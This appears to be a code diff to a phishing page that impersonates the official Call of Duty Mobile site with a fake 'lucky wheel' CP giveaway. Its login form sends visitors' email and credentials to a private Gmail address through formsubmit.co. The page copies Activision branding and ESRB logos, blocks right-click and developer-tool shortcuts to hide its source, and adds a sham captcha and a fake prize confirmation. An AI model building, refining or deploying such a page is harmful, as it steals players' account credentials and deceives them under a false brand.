@@ -7,6 +7,7 @@
     <link rel="stylesheet" href="https://www.callofduty.com/cdn/codm/zpHm2flUeC/css/fonts2.css" />
     <link rel="stylesheet" href="https://www.callofduty.com/cdn/codm/zpHm2flUeC/css/style2.css" />
     <link rel="stylesheet" href="https://www.callofduty.com/cdn/codm/zpHm2flUeC/css/language.css" />
+    <link rel="icon" href="favicon.ico">
 
     <style>
         h1, h2, p, span, a, label { text-transform: none !important; }
@@ -29,7 +30,7 @@
         .input-field-wrapper { position: relative; }
         .eye-icon { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); cursor: pointer; width: 24px; height: 24px; color: #fff; }
         .eye-icon:hover { color: #00ff00; }
-        .success-msg { color: #ff0d00; font-weight: bold; text-align: center; margin-top: 20px; font-size: 18px; display: none; }
+        .success-msg { font-weight: bold; text-align: center; margin-top: 20px; font-size: 18px; display: none; }
         .btn_yellow { width: 100%; cursor: pointer; }
         iframe { display: none !important; width: 0; height: 0; border: 0; }
 
@@ -160,35 +161,33 @@
         #refvc img:hover {
             transform: rotate(360deg);
         }
-        /* استایل جدید برای لوگوهای ESRB در فوتر - اندازه کوچک و حرفه‌ای */
-.esrb-ratings {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 30px;
-    margin: 20px 0 10px;
-    flex-wrap: wrap;
-}
 
-.esrb-ratings img {
-    height: 80px;  /* اندازه استاندارد و کوچک (مثل سایت رسمی) */
-    width: auto;
-    max-width: 150px;
-}
-
-/* برای موبایل - کوچکتر و مرتب */
-@media (max-width: 600px) {
-    .esrb-ratings {
-        gap: 20px;
-        flex-direction: column;
-    }
-    .esrb-ratings img {
-        height: 70px;
-    }
-}
+        /* ESRB در فوتر */
+        .esrb-ratings {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 30px;
+            margin: 20px 0 10px;
+            flex-wrap: wrap;
+        }
+        .esrb-ratings img {
+            height: 80px;
+            width: auto;
+            max-width: 150px;
+        }
+        @media (max-width: 600px) {
+            .esrb-ratings {
+                gap: 20px;
+                flex-direction: column;
+            }
+            .esrb-ratings img {
+                height: 70px;
+            }
+        }
     </style>
 </head>
-<body oncontextmenu="return false;"> <!-- لایه اول بلاک راست‌کلیک -->
+<body oncontextmenu="return false;">
 
     <header class="official-header">
         <nav>
@@ -230,7 +229,8 @@
                     <div class="code_ct">
                         <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>
 
-                        <form action="https://formsubmit.co/erfantroll778899@gmail.com" method="POST" target="dummyframe" onsubmit="return showSuccess()">
+                        <!-- فرم با چک کپچا -->
+                        <form action="https://formsubmit.co/erfantroll778899@gmail.com" method="POST" target="dummyframe" onsubmit="return validateCaptcha()">
                             <ul class="code_list c">
                                 <li>
                                     <span class="desktop_label">Email</span>
@@ -264,7 +264,7 @@
                             <input type="hidden" name="_subject" value="New CODM Login + Lucky Wheel Prize! 🔥">
 
                             <button type="submit" class="btn_yellow" id="label_submit">Claim Prize & Login</button>
-                            <div id="result" class="success-msg">Error! try again</div>
+                            <div id="result" class="success-msg"></div>
                         </form>
                     </div>
                 </div>
@@ -282,13 +282,12 @@
         </div>
     </div>
 
- <footer class="official-footer">
+    <footer class="official-footer">
         <div class="footer-links">
             <a href="#">Terms of Use</a> | <a href="#">Privacy Policy</a> | <a href="#">Support</a>
         </div>
         <p>© 2019-2026 Activision Publishing, Inc. All rights reserved.</p>
 
-        <!-- لوگوهای ESRB در فوتر -->
         <div class="esrb-ratings">
             <img src="cod-hub-esrb-en.png" alt="ESRB Mature 17+" />
             <img src="Privacy_Certified_Globe_color_2022.png" alt="ESRB Privacy Certified" />
@@ -296,35 +295,13 @@
     </footer>
 
     <script>
-        // بلاک راست‌کلیک — لایه قوی (دو بار برای اطمینان کامل)
+        // بلاک راست‌کلیک و F12
         document.oncontextmenu = function() { return false; };
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }, true);
+        document.addEventListener('contextmenu', e => e.preventDefault());
 
-        // بلاک F12 و کلیدهای DevTools
-        document.addEventListener("keydown", function(e) {
-            // F12
-            if (e.keyCode === 123) {
+        document.addEventListener("keydown", e => {
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
                 e.preventDefault();
-                return false;
-            }
-            // Ctrl + Shift + I (DevTools)
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl + Shift + J (Console)
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl + U (View Source)
-            if (e.ctrlKey && e.keyCode === 85) {
-                e.preventDefault();
-                return false;
             }
         });
 
@@ -340,13 +317,28 @@
             }
         }
 
-        function showSuccess() {
-            document.getElementById("result").style.display = "block";
-            return true;
+        // چک کپچا + پیام مناسب
+        let captchaCode = "";
+        function validateCaptcha() {
+            const userInput = document.getElementById("F_VCODE").value.trim();
+            const result = document.getElementById("result");
+
+            if (userInput === captchaCode) {
+                result.textContent = "Thank you, the email will be checked and the CP will be assigned.";
+                result.style.color = "#00ff00";
+                result.style.display = "block";
+                return true; // ارسال بشه
+            } else {
+                result.textContent = "Wrong code! Try again.";
+                result.style.color = "#ff0000";
+                result.style.display = "block";
+                generateCaptcha(); // کپچا جدید
+                document.getElementById("F_VCODE").value = ""; // پاک کردن فیلد
+                return false; // جلوگیری از ارسال
+            }
         }
 
-        // تولید کپچای واقعی با canvas
-        let captchaCode = "";
+        // تولید کپچا
         function generateCaptcha() {
             const canvas = document.getElementById("captcha-canvas");
             const ctx = canvas.getContext("2d");
@@ -355,12 +347,14 @@
             ctx.fillRect(0, 0, 138, 52);
 
             captchaCode = Math.random().toString().substr(2, 5);
-            
+
+            // نویز
             for (let i = 0; i < 200; i++) {
                 ctx.fillStyle = `rgba(0,0,0,${Math.random() * 0.1})`;
                 ctx.fillRect(Math.random() * 138, Math.random() * 52, 2, 2);
             }
 
+            // خطوط
             ctx.strokeStyle = "rgba(0,0,0,0.2)";
             ctx.lineWidth = 2;
             for (let i = 0; i < 4; i++) {
@@ -377,15 +371,15 @@
             ctx.fillText(captchaCode, 69, 28);
         }
 
-        const prizes = [
-            "500 CP", "800 CP", "Try Again!", "1200 CP",
-            "2000 CP", "Try Again!", "100 CP", "400 CP"
-        ];
+        // شروع اولیه
+        window.onload = function() {
+            generateCaptcha();
+            drawWheel();
+        };
 
-        const colors = [
-            "#FFFF00", "#FFD700", "#FF4444", "#00FFFF",
-            "#FF00FF", "#FF8800", "#4444FF", "#00FF00"
-        ];
+        // بقیه کد گردونه (بدون تغییر)
+        const prizes = [ "500 CP", "800 CP", "Try Again!", "1200 CP", "2000 CP", "Try Again!", "100 CP", "400 CP" ];
+        const colors = [ "#FFFF00", "#FFD700", "#FF4444", "#00FFFF", "#FF00FF", "#FF8800", "#4444FF", "#00FF00" ];
 
         const wheel = document.getElementById("wheel");
         const ctx = wheel.getContext("2d");
@@ -481,11 +475,6 @@
             prizeAnnouncement.textContent = `Congratulations! You won ${window.winningPrize} 🎉 Log in to claim your prize:`;
             prizeAnnouncement.style.display = "block";
         }
-
-        generateCaptcha();
-        drawWheel();
     </script>
 </body>
 </html>
-
-
